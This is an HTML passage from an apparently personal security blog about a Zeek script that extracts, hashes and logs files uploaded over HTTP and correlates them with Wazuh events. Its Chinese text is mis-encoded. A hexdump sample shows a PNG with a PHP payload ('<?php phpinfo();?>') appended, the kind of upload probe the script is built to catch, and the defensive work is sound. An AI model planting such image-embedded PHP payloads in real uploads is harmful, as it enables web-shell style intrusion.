class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/files/main</span><br><span class="line">@load base/protocols/http/main</span><br><span class="line"></span><br><span class="line">module Files;</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> &#123;</span><br><span class="line">    redef record Info += &#123;</span><br><span class="line">        hostname:         string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        proxied:          <span class="built_in">set</span>[string] &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        url:              string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        method:           string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        true_client_ip:   string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        logs:             bool &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    option http_info = T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">redef FileExtract::prefix = <span class="string">&quot;/data/logs/zeek/extracted_files/&quot;</span>;</span><br><span class="line"></span><br><span class="line">global mime_to_ext: table[string] of string = &#123;</span><br><span class="line">    [<span class="string">&quot;text/plain&quot;</span>] = <span class="string">&quot;txt&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>] = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-dosexec&quot;</span>] = <span class="string">&quot;exe&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>] = <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;image/png&quot;</span>] = <span class="string">&quot;png&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/pdf&quot;</span>] = <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>] = <span class="string">&quot;jar&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>] = <span class="string">&quot;jar&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>] = <span class="string">&quot;jnlp&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>] = <span class="string">&quot;doc&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>] = <span class="string">&quot;docs&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>] = <span class="string">&quot;xlsx&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>] = <span class="string">&quot;pptx&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global file_analyzer: table[string] of bool = &#123;</span><br><span class="line">    [<span class="string">&quot;Extraction&quot;</span>] = T,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_method: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">    <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_hostname: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">  <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_uri: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">  <span class="string">&quot;/index.php&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/account.php&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> files_filter(rec: Files::Info): bool</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">return</span> rec?<span class="variable">$logs</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">event <span class="function"><span class="title">zeek_init</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">    Log::remove_default_filter(Files::LOG);</span><br><span class="line">    <span class="built_in">local</span> filter: Log::Filter = [<span class="variable">$name</span>=<span class="string">&quot;file_extraction&quot;</span>, <span class="variable">$path</span>=<span class="string">&quot;/data/logs/zeek/file_extraction&quot;</span>, <span class="variable">$pred</span>=files_filter];</span><br><span class="line">    Log::add_filter(Files::LOG, filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">event file_sniff(f: fa_file, meta: fa_metadata) &amp;priority=3</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> ( f<span class="variable">$source</span> != <span class="string">&quot;HTTP&quot;</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! f<span class="variable">$http</span>?<span class="variable">$method</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( f$http<span class="variable">$method</span> !<span class="keyword">in</span> http_method )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! f<span class="variable">$http</span>?<span class="variable">$host</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( f$http<span class="variable">$host</span> !<span class="keyword">in</span> http_hostname )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! meta?<span class="variable">$mime_type</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( meta<span class="variable">$mime_type</span> !<span class="keyword">in</span> mime_to_ext )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    f$info<span class="variable">$logs</span> = T;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( file_analyzer[<span class="string">&quot;Extraction&quot;</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">local</span> fname = fmt(<span class="string">&quot;%s-%s.%s&quot;</span>, f<span class="variable">$source</span>, f<span class="variable">$id</span>, mime_to_ext[meta<span class="variable">$mime_type</span>]);</span><br><span class="line">        Files::add_analyzer(f, Files::ANALYZER_EXTRACT, [<span class="variable">$extract_filename</span>=fname]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    Files::add_analyzer(f, Files::ANALYZER_MD5);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( http_info )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$host</span> )</span><br><span class="line">            f$info<span class="variable">$hostname</span> = f$http<span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$proxied</span> )</span><br><span class="line">            f$info<span class="variable">$proxied</span> = f$http<span class="variable">$proxied</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$method</span> )</span><br><span class="line">            f$info<span class="variable">$method</span> = f$http<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$uri</span> )</span><br><span class="line">            f$info<span class="variable">$url</span> = f$http<span class="variable">$uri</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$true_client_ip</span> )</span><br><span class="line">            f$info<span class="variable">$true_client_ip</span> = f$http<span class="variable">$true_client_ip</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtract::prefix == <span class="string">&quot;&quot;</span> || !f<span class="variable">$info</span>?<span class="variable">$logs</span> )</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">        <span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">        <span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line">        <span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">        <span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">        <span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtract::prefix, ndate);</span><br><span class="line">        mkdir(dest_dir);</span><br><span class="line">        <span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s.%s&quot;</span>, dest_dir, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line">        <span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s/%s %s&quot;</span>, FileExtract::prefix, orig, dest);</span><br><span class="line">        when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h6 id="è„šæœ¬ç®€è¿°ï¼š-1"><a href="#è„šæœ¬ç®€è¿°ï¼š-1" class="headerlink" title="è„šæœ¬ç®€è¿°ï¼š"></a>è„šæœ¬ç®€è¿°ï¼š</h6><pre><code> 1. æ”¯æŒé’ˆå¯¹æŒ‡å®šhostnameï¼Œmethodï¼Œurlï¼Œæ–‡ä»¶å¤´è¿›è¡Œhashçš„æå–ä»¥åŠæ–‡ä»¶è¿˜åŸï¼›
 2. é»˜è®¤æ–‡ä»¶è¿˜åŸæŒ‰ç…§å¹´æœˆæ—¥è¿›è¡Œæ•°æ®çš„å­˜å‚¨ï¼Œä¿å­˜åå­—æŒ‰ç…§MD5åç§°å‘½åï¼›
 3. ä¸°å¯ŒåŒ–äº†æ–‡ä»¶è¿˜åŸçš„æ—¥å¿—ï¼Œå¢åŠ HTTPç›¸å…³å­—æ®µï¼›
</code></pre>
<h6 id="æ—¥å¿—æ ·ä¾‹"><a href="#æ—¥å¿—æ ·ä¾‹" class="headerlink" title="æ—¥å¿—æ ·ä¾‹"></a>æ—¥å¿—æ ·ä¾‹</h6><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1588891497.173108</span>,</span><br><span class="line">  <span class="attr">&quot;fuid&quot;</span>: <span class="string">&quot;FhOGNc2zDdlF3AP5c&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;conn_uids&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;CItQs61wvvtPqSB0Ub&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;depth&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;analyzers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;MD5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SHA1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EXTRACT&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;mime_type&quot;</span>: <span class="string">&quot;image/png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;duration&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;local_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;is_orig&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;seen_bytes&quot;</span>: <span class="number">353</span>,</span><br><span class="line">  <span class="attr">&quot;total_bytes&quot;</span>: <span class="number">353</span>,</span><br><span class="line">  <span class="attr">&quot;missing_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;overflow_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;timedout&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;md5&quot;</span>: <span class="string">&quot;fd0229d400049449084b3864359c445a&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;sha1&quot;</span>: <span class="string">&quot;d836d3f06c0fc075cf0f5d95f50b79cac1dac97d&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted&quot;</span>: <span class="string">&quot;/data/logs/zeek/extracted_files/2020-05-07/fd0229d400049449084b3864359c445a.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted_cutoff&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxied&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;TRUE-CLIENT-IP -&gt; 3.3.3.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-FORWARDED-FOR -&gt; 4.4.4.4&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/image/close.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;true_client_ip&quot;</span>: <span class="string">&quot;3.3.3.3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;logs&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="æ–‡ä»¶è¿˜åŸ"><a href="#æ–‡ä»¶è¿˜åŸ" class="headerlink" title="æ–‡ä»¶è¿˜åŸ"></a>æ–‡ä»¶è¿˜åŸ</h6><p><strong>è¿™æ˜¯å…¶ä¸­ä¸€ä¸ªåŒ…å«æ¶æ„Payloadè¿˜åŸå‡ºçš„å›¾ç‰‡æ ·ä¾‹</strong></p>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Payload-pic.png" alt="image-20200511150738194"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ll /data/logs/zeek/extracted_files/</span><br><span class="line">total 89916</span><br><span class="line">drwxr-xr-x 10 root root      150 May 11 06:14 ./</span><br><span class="line">drwxr-xr-x  4 root root       67 May 11 06:00 ../</span><br><span class="line">drwxr-xr-x  2 root root       50 May  5 07:54 2020-05-04/</span><br><span class="line">drwxr-xr-x  2 root root     4096 May  5 23:51 2020-05-05/</span><br><span class="line">drwxr-xr-x  2 root root   671744 May  6 23:41 2020-05-06/</span><br><span class="line">drwxr-xr-x  2 root root     4096 May  7 22:44 2020-05-07/</span><br><span class="line">drwxr-xr-x  2 root root   741376 May  8 23:59 2020-05-08/</span><br><span class="line">drwxr-xr-x  2 root root 23425024 May  9 23:59 2020-05-09/</span><br><span class="line">drwxr-xr-x  2 root root 25047040 May 10 23:59 2020-05-10/</span><br><span class="line">drwxr-xr-x  2 root root 24846336 May 11 06:14 2020-05-11/</span><br><span class="line"></span><br><span class="line">$ xxd /data/logs/zeek/extracted_files/2020-05-07/884d9474180e5b49f851643cb2442bce.jpg</span><br><span class="line">00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR</span><br><span class="line">00000010: 0000 003c 0000 003c 0806 0000 003a fcd9  ...&lt;...&lt;.....:..</span><br><span class="line">00000020: 7200 0000 1974 4558 7453 6f66 7477 6172  r....tEXtSoftwar</span><br><span class="line">00000030: 6500 4164 6f62 6520 496d 6167 6552 6561  e.Adobe ImageRea</span><br><span class="line">00000040: 6479 71c9 653c 0000 0320 6954 5874 584d  dyq.e&lt;... iTXtXM</span><br><span class="line">00000050: 4c3a 636f 6d2e 6164 6f62 652e 786d 7000  L:com.adobe.xmp.</span><br><span class="line">..........</span><br><span class="line">00001030: 8916 ce5f 7480 2f38 c073 69f1 5c14 83fb  ..._t./8.si.\...</span><br><span class="line">00001040: aa9d 42a3 8f4b ff05 e012 e04b 802f 01be  ..B..K.....K./..</span><br><span class="line">00001050: 04b8 91c7 ff04 1800 bcae 819f d1da 1896  ................</span><br><span class="line">00001060: 0000 0000 4945 4e44 ae42 6082 3c3f 7068  ....IEND.B`.&lt;?ph</span><br><span class="line">00001070: 7020 7068 7069 6e66 6f28 293b 3f3e 1a    p phpinfo();?&gt;.</span><br></pre></td></tr></table></figure>

<h6 id="æ€»ç»“ï¼š-1"><a href="#æ€»ç»“ï¼š-1" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h6><p>é€šè¿‡Zeekè„šæœ¬æ‰©å±•åï¼Œå¯ä»¥<strong>â€œéšæ„æ‰€æ¬²â€</strong>çš„è·å–å„ç§ç±»å‹æ–‡ä»¶çš„Hashä»¥åŠå®šåˆ¶åŒ–çš„è¿›è¡Œæ–‡ä»¶è¿˜åŸã€‚</p>
<h4 id="å¤´è„‘é£æš´"><a href="#å¤´è„‘é£æš´" class="headerlink" title="å¤´è„‘é£æš´"></a>å¤´è„‘é£æš´</h4><p>å½“è·å–æ–‡ä»¶ä¸Šä¼ çš„Hashä¹‹åï¼Œå¯ä»¥å°è¯•æ‰©å±•å‡ºä»¥ä¸‹2ä¸ªå®‰å…¨äº‹ä»¶ï¼š</p>
<ol>
<li><p>åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸã€‚</p>
<p>é€šå¸¸ç¬¬ä¸€æ—¶é—´ä¼šéœ€è¦å®šä½æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œè‹¥ä¸Šä¼ æˆåŠŸéœ€è¦è¿›è¡Œç›¸å…³çš„äº‹ä»¶è¾“å‡ºï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡‡ç”¨HIDSè¿›è¡Œæ–‡ä»¶è½åœ°äº‹ä»¶çš„å…³è”ã€‚</p>
</li>
<li><p>å…³è”æ€æ¯’å¼•æ“/å¨èƒæƒ…æŠ¥ã€‚</p>
<p>å°†ç¬¬ä¸€ä¸ªå…³è”å¥½çš„äº‹ä»¶è¿›è¡ŒHashçš„ç¢°æ’ï¼Œæœ€å¸¸è§çš„æ˜¯å°†HASHé€åˆ°VTæˆ–å¨èƒæƒ…æŠ¥ã€‚</p>
</li>
</ol>
<p>è¿™é‡Œä»¥<strong>Wazuh</strong>äº‹ä»¶ä¸ºä¾‹ï¼Œå°†<strong>Zeek</strong>çš„æ–‡ä»¶è¿˜åŸäº‹ä»¶ä¸<strong>Wazuh</strong>çš„æ–°å¢æ–‡ä»¶äº‹ä»¶è¿›è¡Œå…³è”ï¼Œå…³è”æŒ‡æ ‡é‡‡ç”¨<strong>Hash</strong>ã€‚</p>
<p><strong>a. Zeekäº‹ä»¶</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1589158812.471443</span>,</span><br><span class="line">  <span class="attr">&quot;fuid&quot;</span>: <span class="string">&quot;FBkqzM2AFg0jrioji6&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;conn_uids&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;CcOyQo2ziEuoLBNIb9&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;depth&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;analyzers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;SHA1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EXTRACT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;MD5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DATA_EVENT&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;mime_type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;duration&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;local_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;is_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;seen_bytes&quot;</span>: <span class="number">31</span>,</span><br><span class="line">  <span class="attr">&quot;total_bytes&quot;</span>: <span class="number">31</span>,</span><br><span class="line">  <span class="attr">&quot;missing_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;overflow_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;timedout&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;md5&quot;</span>: <span class="string">&quot;37a74f452f1c49854a2951fd605687c5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted&quot;</span>: <span class="string">&quot;/data/logs/zeek/extracted_files/2020-05-11/37a74f452f1c49854a2951fd605687c5.txt&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted_cutoff&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxied&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;X-FORWARDED-FOR -&gt; 3.3.3.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TRUE-CLIENT-IP -&gt; 4.4.4.4&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/index.php&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;true_client_ip&quot;</span>: <span class="string">&quot;4.4.4.4&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;logs&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>b. Wazuh äº‹ä»¶</strong></p>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Wazuh-Hash-1.png" alt="image-20200511144805354"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/03/29/Elasticsearch-alias%E4%B8%8Ereindex%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/03/29/Elasticsearch-alias%E4%B8%8Ereindex%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/" class="post-title-link" itemprop="url">Elasticsearch-aliasä¸reindexçš„ä½¿ç”¨åœºæ™¯</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2020-03-29 12:39:19" itemprop="dateCreated datePublished" datetime="2020-03-29T12:39:19+08:00">2020-03-29</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-04-04 19:17:25" itemprop="dateModified" datetime="2020-04-04T19:17:25+08:00">2020-04-04</time>
      </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>1.7k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>2 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
